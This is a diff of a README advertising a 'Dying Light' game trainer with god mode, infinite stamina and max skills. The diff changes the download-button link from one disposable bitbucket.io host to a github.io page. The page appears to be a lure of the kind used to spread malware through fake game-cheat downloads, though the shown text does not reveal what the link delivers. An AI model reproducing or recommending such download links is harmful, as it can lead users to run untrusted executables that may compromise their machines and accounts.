@@ -2,7 +2,7 @@
 
 **Sick of dying to Volatiles or grinding XP like it’s your day job? A Dying Light trainer gives you full control with instant god mode, infinite stamina, max skills, and more insane buffs.**
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload5.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Dying-Light-Trainer-zar4.github.io/.github)
 ---
 
 ## 🧠 What is a Trainer in Dying Light?
